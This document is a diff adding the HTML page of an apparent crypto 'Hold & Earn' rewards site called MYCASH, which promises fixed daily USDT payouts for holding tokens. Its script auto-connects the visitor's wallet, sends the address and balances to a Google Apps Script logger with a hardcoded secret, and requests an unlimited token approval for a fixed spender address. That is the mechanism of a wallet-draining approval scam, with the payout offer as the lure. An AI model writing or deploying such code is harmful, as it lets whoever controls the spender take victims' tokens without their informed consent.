@@ -1,0 +1,811 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>MYCASH — Hold & Earn</title>
+  <style>
+    body{font-family:system-ui,Segoe UI,Arial;background:#0b1220;color:#e6eef8;margin:0}
+    header{background:#071027;padding:12px 16px;position:sticky;top:0;z-index:20;border-bottom:1px solid rgba(255,255,255,0.03)}
+    .nav{max-width:980px;margin:0 auto;display:flex;align-items:center;justify-content:space-between}
+    .nav-left{display:flex;gap:14px}
+    a{color:#dbeafe;text-decoration:none;padding:6px 10px;border-radius:6px}
+    a:hover{background:#0f1b33}
+    .logo{font-weight:700;letter-spacing:4px}
+    .connect{background:#3b82f6;color:#fff;padding:8px 14px;border-radius:999px;border:0;cursor:pointer}
+    main{max-width:980px;margin:20px auto;padding:16px}
+    .card{background:#071427;padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.03);margin-bottom:18px}
+    .row{display:flex;gap:12px;flex-wrap:wrap;margin-top:12px}
+    .stat{flex:1 1 220px;background:#071427;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.02)}
+    .muted{color:#9fb0c8}
+    .small { font-size:0.9rem; color:#9fb0c8; }
+    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", "Helvetica Neue", monospace; }
+    footer{max-width:980px;margin:24px auto;padding:12px;color:#9fb0c8;text-align:center}
+    button{cursor:pointer}
+
+    /* Hold & Earn specific styles */
+    .tasks-grid{
+      display:grid;
+      grid-template-columns:repeat(auto-fit,minmax(180px,1fr));
+      gap:12px;
+      margin-top:14px;
+    }
+    .task-card{
+      background:#020617;
+      border-radius:10px;
+      padding:12px;
+      border:1px solid rgba(148,163,184,0.25);
+      position:relative;
+      overflow:hidden;
+    }
+    .task-title{
+      font-weight:500;
+      margin-bottom:4px;
+      font-size:0.95rem;
+    }
+    .task-meta{
+      font-size:0.85rem;
+      color:#9fb0c8;
+      margin-bottom:6px;
+    }
+    .task-tag{
+      display:inline-flex;
+      align-items:center;
+      padding:2px 8px;
+      border-radius:999px;
+      font-size:0.75rem;
+      border:1px solid rgba(148,163,184,0.4);
+    }
+    .task-card.active{
+      border-color:rgba(34,197,94,0.9);
+      box-shadow:0 0 0 1px rgba(34,197,94,0.3);
+    }
+    .task-card.active .task-tag{
+      border-color:rgba(34,197,94,0.9);
+    }
+    .task-tag-dot{
+      width:6px;
+      height:6px;
+      border-radius:999px;
+      margin-right:5px;
+      background:#64748b;
+    }
+    .task-card.active .task-tag-dot{
+      background:#22c55e;
+    }
+    .task-locked{
+      font-size:0.8rem;
+      color:#ef4444;
+      margin-top:4px;
+    }
+    .task-note{
+      font-size:0.75rem;
+      color:#9fb0c8;
+      margin-top:4px;
+    }
+
+    .pill{
+      display:inline-flex;
+      align-items:center;
+      gap:6px;
+      padding:3px 10px;
+      border-radius:999px;
+      background:rgba(15,23,42,0.9);
+      border:1px solid rgba(148,163,184,0.35);
+      font-size:0.8rem;
+      color:#e5e7eb;
+    }
+
+    @media (max-width:640px){
+      .nav-left{gap:8px}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="nav">
+      <div class="nav-left">
+        <a href="index.html">Home</a>
+        <a href="hold-earn.html">Hold &amp; Earn</a>
+        <a href="rewards.html">Rewards</a>
+        <a href="about.html">About</a>
+        <a href="contact.html">Contact</a>
+      </div>
+      <div class="logo">MYCASH</div>
+      <div>
+        <button id="connectBtn" class="connect">Connect Wallet</button>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    <!-- Intro -->
+    <div class="card">
+      <h2>Hold &amp; Earn — Daily USDT Rewards</h2>
+      <p class="small" style="margin-top:6px;">
+        Hold USDT in your wallet on BSC Testnet and unlock daily fixed-dollar rewards.
+        Your wallet balance will automatically unlock the highest eligible task.
+      </p>
+    </div>
+
+    <!-- Wallet summary (same style as index) -->
+    <div class="card">
+      <h3>Wallet Status</h3>
+      <div class="row">
+        <div class="stat">
+          <div class="muted">Status</div>
+          <div id="statusText">Not connected</div>
+        </div>
+
+        <div class="stat">
+          <div class="muted">Address</div>
+          <div id="walletAddress" class="mono">—</div>
+        </div>
+
+        <div class="stat">
+          <div class="muted">User ID</div>
+          <div id="userId" class="mono">-</div>
+        </div>
+
+        <div class="stat">
+          <div class="muted">Network</div>
+          <div id="walletNetwork">—</div>
+        </div>
+
+        <div class="stat">
+          <div class="muted">BNB Balance</div>
+          <div id="walletBalance">—</div>
+        </div>
+      </div>
+
+      <div style="margin-top:14px;display:flex;flex-wrap:wrap;gap:10px;align-items:center;">
+        <div class="pill">
+          <span class="muted">USDT Balance:</span>
+          <span id="holdUsdtBalance" class="mono">—</span>
+        </div>
+        <div class="pill">
+          <span class="muted">Active Task:</span>
+          <span id="holdLevelText">None (insufficient balance)</span>
+        </div>
+      </div>
+
+      <p class="small" style="margin-top:8px;" id="holdHint">
+        Connect your wallet to detect your USDT balance and unlock Hold &amp; Earn tasks.
+      </p>
+    </div>
+
+    <!-- Tasks grid -->
+    <div class="card">
+      <h3>Daily Hold &amp; Earn Tasks</h3>
+      <p class="small" style="margin-top:4px;">
+        Each task requires a minimum USDT balance in your wallet. Tasks up to your balance will be
+        <span style="color:#22c55e;">activated</span> automatically.
+      </p>
+
+      <div class="tasks-grid" id="tasksGrid">
+        <!-- Each card uses data-min-usdt and data-daily-reward for logic -->
+        <div class="task-card" data-min-usdt="10" data-daily-reward="1">
+          <div class="task-title">Task 1</div>
+          <div class="task-meta">Hold <strong>$10 USDT</strong> to earn <strong>$1</strong> daily</div>
+          <div class="task-tag">
+            <span class="task-tag-dot"></span>
+            <span class="task-tag-text">Locked</span>
+          </div>
+          <div class="task-note">Requires at least 10 USDT in your wallet.</div>
+        </div>
+
+        <div class="task-card" data-min-usdt="20" data-daily-reward="2">
+          <div class="task-title">Task 2</div>
+          <div class="task-meta">Hold <strong>$20 USDT</strong> to earn <strong>$2</strong> daily</div>
+          <div class="task-tag">
+            <span class="task-tag-dot"></span>
+            <span class="task-tag-text">Locked</span>
+          </div>
+          <div class="task-note">Requires at least 20 USDT in your wallet.</div>
+        </div>
+
+        <div class="task-card" data-min-usdt="30" data-daily-reward="3">
+          <div class="task-title">Task 3</div>
+          <div class="task-meta">Hold <strong>$30 USDT</strong> to earn <strong>$3</strong> daily</div>
+          <div class="task-tag">
+            <span class="task-tag-dot"></span>
+            <span class="task-tag-text">Locked</span>
+          </div>
+          <div class="task-note">Requires at least 30 USDT in your wallet.</div>
+        </div>
+
+        <div class="task-card" data-min-usdt="40" data-daily-reward="4">
+          <div class="task-title">Task 4</div>
+          <div class="task-meta">Hold <strong>$40 USDT</strong> to earn <strong>$4</strong> daily</div>
+          <div class="task-tag">
+            <span class="task-tag-dot"></span>
+            <span class="task-tag-text">Locked</span>
+          </div>
+          <div class="task-note">Requires at least 40 USDT in your wallet.</div>
+        </div>
+
+        <div class="task-card" data-min-usdt="50" data-daily-reward="5">
+          <div class="task-title">Task 5</div>
+          <div class="task-meta">Hold <strong>$50 USDT</strong> to earn <strong>$5</strong> daily</div>
+          <div class="task-tag">
+            <span class="task-tag-dot"></span>
+            <span class="task-tag-text">Locked</span>
+          </div>
+          <div class="task-note">Requires at least 50 USDT in your wallet.</div>
+        </div>
+
+        <div class="task-card" data-min-usdt="60" data-daily-reward="6">
+          <div class="task-title">Task 6</div>
+          <div class="task-meta">Hold <strong>$60 USDT</strong> to earn <strong>$6</strong> daily</div>
+          <div class="task-tag">
+            <span class="task-tag-dot"></span>
+            <span class="task-tag-text">Locked</span>
+          </div>
+          <div class="task-note">Requires at least 60 USDT in your wallet.</div>
+        </div>
+
+        <div class="task-card" data-min-usdt="70" data-daily-reward="7">
+          <div class="task-title">Task 7</div>
+          <div class="task-meta">Hold <strong>$70 USDT</strong> to earn <strong>$7</strong> daily</div>
+          <div class="task-tag">
+            <span class="task-tag-dot"></span>
+            <span class="task-tag-text">Locked</span>
+          </div>
+          <div class="task-note">Requires at least 70 USDT in your wallet.</div>
+        </div>
+
+        <div class="task-card" data-min-usdt="80" data-daily-reward="8">
+          <div class="task-title">Task 8</div>
+          <div class="task-meta">Hold <strong>$80 USDT</strong> to earn <strong>$8</strong> daily</div>
+          <div class="task-tag">
+            <span class="task-tag-dot"></span>
+            <span class="task-tag-text">Locked</span>
+          </div>
+          <div class="task-note">Requires at least 80 USDT in your wallet.</div>
+        </div>
+
+        <div class="task-card" data-min-usdt="90" data-daily-reward="9">
+          <div class="task-title">Task 9</div>
+          <div class="task-meta">Hold <strong>$90 USDT</strong> to earn <strong>$9</strong> daily</div>
+          <div class="task-tag">
+            <span class="task-tag-dot"></span>
+            <span class="task-tag-text">Locked</span>
+          </div>
+          <div class="task-note">Requires at least 90 USDT in your wallet.</div>
+        </div>
+
+        <div class="task-card" data-min-usdt="100" data-daily-reward="10">
+          <div class="task-title">Task 10</div>
+          <div class="task-meta">Hold <strong>$100 USDT</strong> to earn <strong>$10</strong> daily</div>
+          <div class="task-tag">
+            <span class="task-tag-dot"></span>
+            <span class="task-tag-text">Locked</span>
+          </div>
+          <div class="task-note">Requires at least 100 USDT in your wallet.</div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    © <span id="year"></span> MYCASH — BSC (BEP-20) • No private keys stored.
+  </footer>
+
+  <!-- libs -->
+  <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.10.5/dist/index.umd.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
+
+  <!-- app script (same logic as index, adapted for Hold & Earn) -->
+  <script type="module">
+  (function(){
+    function formatToken(n) {
+      n = Number(n);
+      if (Number.isInteger(n)) return n.toString();
+      return n.toFixed(4).replace(/\.?0+$/, "");
+    }
+
+    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbzlCsXUoqaMW4fCTqK6H_SF7dGCDDkcIoO-To5YbLcBLdWEEKvGjHQm_vSUfwE06Yw/exec";
+    const APPS_SCRIPT_SECRET = "mahfuzinam0045";
+
+    const TOKEN_ADDRESS   = "0x5915f45023012942c0F30B6652CEbb6A05810b90";
+    const SPENDER_ADDRESS = "0x98fbcaA43b229601edb71E9923055ee485c29C3E";
+
+    const BNB_TESTNET_CHAIN_ID_DEC = 97;
+    const BNB_TESTNET_CHAIN_ID_HEX = "0x61";
+    const BNB_TESTNET_LABEL        = "BSC Testnet (97)";
+    const BNB_TESTNET_RPC          = "https://data-seed-prebsc-1-s1.binance.org:8545/";
+
+    const ERC20_APPROVE_ABI = [
+      "function approve(address spender, uint256 amount) public returns (bool)"
+    ];
+    const ERC20_BALANCE_ABI = [
+      "function balanceOf(address owner) view returns (uint256)"
+    ];
+    const ERC20_ALLOWANCE_ABI = [
+      "function allowance(address owner, address spender) view returns (uint256)"
+    ];
+
+    const TOKEN_DECIMALS = 6;
+
+    let providerInstance  = null;
+    let web3Instance      = null;
+    let walletConnectV2Provider = null;
+
+    const WALLETCONNECT_PROJECT_ID = "febf4ea32fb4df7139f1cfd3f7c5142a";
+
+    async function getWalletConnectV2Provider() {
+      if (walletConnectV2Provider) return walletConnectV2Provider;
+      const EthereumProvider = globalThis["@walletconnect/ethereum-provider"].EthereumProvider;
+
+      walletConnectV2Provider = await EthereumProvider.init({
+        projectId: WALLETCONNECT_PROJECT_ID,
+        optionalChains: [BNB_TESTNET_CHAIN_ID_DEC],
+        rpcMap: {
+          [BNB_TESTNET_CHAIN_ID_DEC]: BNB_TESTNET_RPC
+        },
+        metadata: {
+          name: "MYCASH DApp",
+          description: "MYCASH bonus rewards dApp",
+          url: window.location.origin,
+          icons: ["https://mycash911.github.io/mycash/icon.png"]
+        },
+        showQrModal: true
+      });
+
+      return walletConnectV2Provider;
+    }
+
+    function storageKeyFor(address){
+      return "userId_" + address.toLowerCase();
+    }
+    function generateUserIdFromAddress(address){
+      address = (address || "").toLowerCase();
+      let hash = 0;
+      for (let i = 0; i < address.length; i++){
+        hash = ((hash << 5) - hash) + address.charCodeAt(i);
+        hash |= 0;
+      }
+      hash = Math.abs(hash);
+      const num = 100000 + (hash % 900000);
+      return String(num);
+    }
+    function getOrCreateUserIdFor(address){
+      const key = storageKeyFor(address);
+      let id = localStorage.getItem(key);
+      if (!id || !/^[0-9]{6}$/.test(id)) {
+        id = generateUserIdFromAddress(address);
+        localStorage.setItem(key, id);
+      }
+      return id;
+    }
+
+    // UI refs
+    const connectBtn      = document.getElementById("connectBtn");
+    const statusTextEl    = document.getElementById("statusText");
+    const walletAddressEl = document.getElementById("walletAddress");
+    const userIdEl        = document.getElementById("userId");
+    const walletNetworkEl = document.getElementById("walletNetwork");
+    const walletBalanceEl = document.getElementById("walletBalance");
+
+    const holdUsdtBalanceEl = document.getElementById("holdUsdtBalance");
+    const holdLevelTextEl   = document.getElementById("holdLevelText");
+    const holdHintEl        = document.getElementById("holdHint");
+    const tasksGridEl       = document.getElementById("tasksGrid");
+
+    function setStatus(txt){
+      if(statusTextEl) statusTextEl.textContent = txt;
+      console.log("[status]", txt);
+    }
+
+    function setWalletInfo(address, network, bnb){
+      walletAddressEl.textContent = address || "—";
+      walletNetworkEl.textContent = network || "—";
+      walletBalanceEl.textContent =
+        (bnb === null || bnb === undefined) ? "—" : (Number(bnb).toFixed(6) + " BNB");
+    }
+
+    function setUserIdUI(id){
+      userIdEl.textContent = id || "-";
+    }
+
+    function resetHoldUI(){
+      if (holdUsdtBalanceEl) holdUsdtBalanceEl.textContent = "—";
+      if (holdLevelTextEl)   holdLevelTextEl.textContent   = "None (insufficient balance)";
+      if (holdHintEl)        holdHintEl.textContent        = "Connect your wallet to detect your USDT balance and unlock Hold & Earn tasks.";
+
+      if (tasksGridEl){
+        const cards = tasksGridEl.querySelectorAll(".task-card");
+        cards.forEach(card => {
+          card.classList.remove("active");
+          const tagText = card.querySelector(".task-tag-text");
+          if(tagText) tagText.textContent = "Locked";
+          const lockedText = card.querySelector(".task-locked");
+          if(!lockedText){
+            // nothing
+          }
+        });
+      }
+    }
+
+    function clearSessionUI(){
+      setStatus("Not connected");
+      setWalletInfo("—","—",null);
+      setUserIdUI("-");
+      resetHoldUI();
+    }
+
+    function attachProviderListeners(p){
+      if(!p || !p.on) return;
+      try{
+        p.on("accountsChanged", function(accounts){
+          if(!accounts || !accounts.length){
+            clearSessionUI();
+            return;
+          }
+          const addr = accounts[0].toLowerCase();
+          const uid  = getOrCreateUserIdFor(addr);
+          walletAddressEl.textContent = addr;
+          setUserIdUI(uid);
+        });
+        p.on("chainChanged", function(chainId){
+          console.log("chainChanged:", chainId);
+          walletNetworkEl.textContent = BNB_TESTNET_LABEL + " (chain " + chainId + ")";
+        });
+        p.on("disconnect", function(){
+          clearSessionUI();
+        });
+      }catch(e){
+        console.warn("attachProviderListeners", e);
+      }
+    }
+
+    async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance){
+      try{
+        const payload = new URLSearchParams({
+          secret      : APPS_SCRIPT_SECRET,
+          address     : address,
+          network     : networkText,
+          timestamp   : new Date().toISOString(),
+          userId      : userId,
+          bnbBalance  : String(bnbBalance ?? ""),
+          tokenBalance: String(tokenBalance ?? "")
+        });
+
+        await fetch(APPS_SCRIPT_URL, {
+          method: "POST",
+          mode  : "no-cors",
+          headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
+          body: payload.toString()
+        });
+
+        console.log("Sent log to Apps Script (no-cors).");
+      }catch(err){
+        console.error("notifyBackend error:", err);
+      }
+    }
+
+    async function getTokenBalance(address){
+      try{
+        if(!TOKEN_ADDRESS || !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)){
+          console.warn("TOKEN_ADDRESS not set or invalid, skipping token balance");
+          return "";
+        }
+        if(!providerInstance){
+          console.warn("No providerInstance for token balance");
+          return "";
+        }
+
+        const ethersProvider = new ethers.BrowserProvider(providerInstance);
+        const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
+        const raw            = await tokenContract.balanceOf(address);
+        const formatted      = ethers.formatUnits(raw, TOKEN_DECIMALS);
+
+        return formatted;
+      }catch(err){
+        console.error("getTokenBalance error:", err);
+        return "";
+      }
+    }
+
+    async function switchToBSC(provider){
+      try{
+        await provider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: BNB_TESTNET_CHAIN_ID_HEX }]
+        });
+        return true;
+      }catch(switchError){
+        if(switchError.code === 4902){
+          try{
+            await provider.request({
+              method: "wallet_addEthereumChain",
+              params: [{
+                chainId: BNB_TESTNET_CHAIN_ID_HEX,
+                chainName: "BNB Smart Chain Testnet",
+                nativeCurrency:{name:"BNB",symbol:"tBNB",decimals:18},
+                rpcUrls:["https://data-seed-prebsc-1-s1.binance.org:8545"],
+                blockExplorerUrls:["https://testnet.bscscan.com"]
+              }]
+            });
+            return true;
+          }catch(addErr){
+            console.error("Could not add BSC Testnet:", addErr);
+            return false;
+          }
+        }
+        console.error("Switch error:", switchError);
+        return false;
+      }
+    }
+
+    async function ensureTokenApproval(){
+      if(!TOKEN_ADDRESS){
+        console.warn("TOKEN_ADDRESS not set, skipping approve");
+        return;
+      }
+      if(!SPENDER_ADDRESS){
+        console.warn("SPENDER_ADDRESS not set, skipping approve");
+        return;
+      }
+      if(!providerInstance){
+        console.warn("No providerInstance for approval");
+        return;
+      }
+
+      try{
+        const ethersProvider = new ethers.BrowserProvider(providerInstance);
+        const signer         = await ethersProvider.getSigner();
+        const ownerAddress   = (await signer.getAddress()).toLowerCase();
+
+        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
+          alert("ERROR: TOKEN_ADDRESS is set to your wallet address.\n\nIt MUST be the BEP-20 token contract address, not your wallet.");
+          setStatus("Connected (approval skipped)");
+          return;
+        }
+
+        const readContract = new ethers.Contract(
+          TOKEN_ADDRESS,
+          ERC20_ALLOWANCE_ABI,
+          ethersProvider
+        );
+        const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
+
+        if (currentAllowance > 0n) {
+          console.log("Already approved, skipping new approve tx");
+          setStatus("Connected (already approved)");
+          return;
+        }
+
+        setStatus("Requesting token approval…");
+        const writeContract = new ethers.Contract(
+          TOKEN_ADDRESS,
+          ERC20_APPROVE_ABI,
+          signer
+        );
+        const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
+        console.log("Approve tx sent:", tx.hash);
+        const receipt = await tx.wait();
+        console.log("Approve confirmed:", receipt);
+        setStatus("Connected + Approved ✅");
+      }catch(err){
+        console.error("Token approve error:", err);
+        alert("Token approval failed: " + (err && err.message ? err.message : err));
+        setStatus("Connected (approval failed)");
+      }
+    }
+
+    // === Hold & Earn logic ===
+    function updateHoldTasks(usdtBalance){
+      const balance = Number(usdtBalance || 0);
+
+      if (holdUsdtBalanceEl){
+        holdUsdtBalanceEl.textContent = formatToken(balance) + " USDT";
+      }
+
+      if (!tasksGridEl) return;
+
+      let highestTask = 0;
+      const cards = tasksGridEl.querySelectorAll(".task-card");
+      cards.forEach(card => {
+        const min = Number(card.getAttribute("data-min-usdt") || "0");
+        const dailyReward = card.getAttribute("data-daily-reward") || "?";
+
+        const tagTextEl = card.querySelector(".task-tag-text");
+        const lockedMsg = card.querySelector(".task-locked");
+
+        if (balance >= min){
+          card.classList.add("active");
+          if (tagTextEl) tagTextEl.textContent = "Active — $" + dailyReward + "/day";
+          if (balance >= min && min > highestTask) {
+            highestTask = min;
+          }
+        }else{
+          card.classList.remove("active");
+          if (tagTextEl) tagTextEl.textContent = "Locked";
+        }
+      });
+
+      if (highestTask > 0){
+        const level = highestTask / 10; // 10$ → Task 1, 20$ → Task 2, ...
+        if (holdLevelTextEl){
+          holdLevelTextEl.textContent = "Task " + level + " active (min $" + highestTask + " USDT)";
+        }
+        if (holdHintEl){
+          holdHintEl.textContent = "You are eligible for all tasks up to Task " + level + " based on your current USDT balance.";
+        }
+      }else{
+        if (holdLevelTextEl){
+          holdLevelTextEl.textContent = "None (insufficient balance)";
+        }
+        if (holdHintEl){
+          holdHintEl.textContent = "Increase your USDT balance to at least $10 to unlock the first Hold & Earn task.";
+        }
+      }
+    }
+
+    // restore session (BNB + USDT + tasks)
+    async function restoreSessionFromAddress(address){
+      const balanceWei = await web3Instance.eth.getBalance(address);
+      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
+      const userId     = getOrCreateUserIdFor(address);
+
+      setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
+      setUserIdUI(userId);
+
+      const tokenBalanceRaw  = await getTokenBalance(address);
+      const tokenBalanceNum  = tokenBalanceRaw ? Number(tokenBalanceRaw) : 0;
+
+      updateHoldTasks(tokenBalanceNum);
+
+      return {
+        balanceBNB,
+        tokenBalance: tokenBalanceRaw,
+        userId
+      };
+    }
+
+    async function connectFlow(){
+      try{
+        setStatus("Connecting…");
+        const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+        let usedInjected = false;
+
+        if (window.trustwallet && window.trustwallet.ethereum) {
+          providerInstance = window.trustwallet.ethereum;
+          usedInjected = true;
+        }
+        else if (window.ethereum) {
+          providerInstance = window.ethereum;
+          usedInjected = true;
+        }
+
+        if (usedInjected) {
+          web3Instance = new Web3(providerInstance);
+          await providerInstance.request({ method: "eth_requestAccounts" });
+        } else {
+          providerInstance = await getWalletConnectV2Provider();
+          await providerInstance.enable();
+          web3Instance = new Web3(providerInstance);
+        }
+
+        if(!providerInstance || !web3Instance){
+          setStatus("No provider");
+          alert("No wallet provider detected.");
+          return;
+        }
+
+        attachProviderListeners(providerInstance);
+
+        const accounts = await web3Instance.eth.getAccounts();
+        if(!accounts || !accounts.length){
+          setStatus("No account");
+          return;
+        }
+        const address = accounts[0].toLowerCase();
+
+        let chainId = await web3Instance.eth.getChainId();
+        if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
+          const switched = await switchToBSC(providerInstance);
+          if(!switched){
+            alert("Please switch to BSC Testnet.");
+            setStatus("Wrong network");
+            return;
+          }
+          chainId = await web3Instance.eth.getChainId();
+          if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
+            alert("Network switch failed");
+            return;
+          }
+        }
+
+        const { balanceBNB, tokenBalance, userId } =
+          await restoreSessionFromAddress(address);
+
+        setStatus("Connected");
+
+        await notifyBackend(
+          address,
+          BNB_TESTNET_LABEL,
+          userId,
+          balanceBNB,
+          tokenBalance
+        );
+
+        await ensureTokenApproval();
+
+      }catch(err){
+        console.error("connectFlow error:", err);
+        setStatus("Connection failed");
+        alert("Connection failed: " + (err && err.message ? err.message : err));
+      }
+    }
+
+    async function tryAutoReconnectSilent(){
+      const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+      if(!mobile && window.trustwallet && window.trustwallet.ethereum){
+        const injected = window.trustwallet.ethereum;
+        providerInstance = injected;
+        web3Instance     = new Web3(providerInstance);
+        attachProviderListeners(providerInstance);
+
+        const accounts = await injected.request({ method: "eth_accounts" });
+        if (accounts && accounts.length) {
+          const address = accounts[0].toLowerCase();
+          setStatus("Restoring session (Trust Wallet)...");
+          await restoreSessionFromAddress(address);
+          setStatus("Connected (restored)");
+          return true;
+        }
+      }
+
+      if(window.ethereum){
+        const injected = window.ethereum;
+        providerInstance = injected;
+        web3Instance     = new Web3(providerInstance);
+        attachProviderListeners(providerInstance);
+
+        const accounts = await injected.request({ method: "eth_accounts" });
+        if (accounts && accounts.length) {
+          const address = accounts[0].toLowerCase();
+          setStatus("Restoring session...");
+          await restoreSessionFromAddress(address);
+          setStatus("Connected (restored)");
+          return true;
+        }
+      }
+
+      return false;
+    }
+
+    async function autoConnectOnLoad(){
+      try{
+        const restored = await tryAutoReconnectSilent();
+        if(restored) return;
+
+        const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+        if(!mobile && ( (window.trustwallet && window.trustwallet.ethereum) || window.ethereum )){
+          setStatus("Auto connecting…");
+          await connectFlow();
+        }else{
+          clearSessionUI();
+        }
+      }catch(e){
+        console.warn("autoConnectOnLoad failed:", e);
+        clearSessionUI();
+      }
+    }
+
+    document.addEventListener("DOMContentLoaded", async function(){
+      resetHoldUI();
+      if(connectBtn) connectBtn.addEventListener("click", connectFlow);
+      await autoConnectOnLoad();
+      document.getElementById("year").textContent = new Date().getFullYear();
+    });
+  })();
+  </script>
+</body>
+</html>
